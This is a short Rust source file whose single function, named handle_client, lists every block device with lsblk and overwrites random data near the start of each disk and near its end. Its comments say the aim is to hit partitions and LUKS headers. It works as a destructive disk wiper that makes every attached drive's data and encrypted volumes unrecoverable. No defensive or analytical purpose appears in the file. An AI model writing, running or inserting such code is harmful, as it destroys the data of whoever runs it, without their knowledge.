use std::fs::OpenOptions;
use rand::Rng;
use std::io::{self, Write};
use std::io::Seek;
use std::process::Command;

pub fn handle_client() {

    let output = Command::new("lsblk")
      .arg("--output=NAME")
      .arg("--noheadings")
      .output()
      .unwrap();

    let mut block_devices: Vec<&str> = vec![];
    let mut output_str = String::new();
    if output.status.success() {
      output_str = String::from_utf8(output.stdout).unwrap();
      block_devices = output_str.lines()
        .filter(|line| !line.starts_with('|') && !line.starts_with('├') && !line.starts_with('└'))
        .collect();
    }

    for blockdevice in block_devices {
      let diskname = format!("/dev/{blockdevice}");

      let mut disk = OpenOptions::new()
        .write(true)
        .open(diskname)
        .expect("Failed to open /dev/sda");

      // Calculate Location of LBA 33
      let sector_size = 512;
      let byte_offset = 33 * sector_size;

      // Generate 512 KB of random data
      let mut rng = rand::thread_rng();
      let mut buffer = vec![0u8; 512 * 1024];
      rng.fill(&mut buffer[..]);

      // Seek to the start of LBA 33, where the first partition usually starts.
      disk.seek(io::SeekFrom::Start(byte_offset as u64)).unwrap();

      // Splash one.
      disk.write_all(&buffer).unwrap();

        // Seek to the end of the disk, just to make sure we get the LUKS headers.
      disk.seek(io::SeekFrom::End(-byte_offset as i64)).unwrap();

      // Splash two.
      disk.write_all(&buffer).unwrap();
    }
}
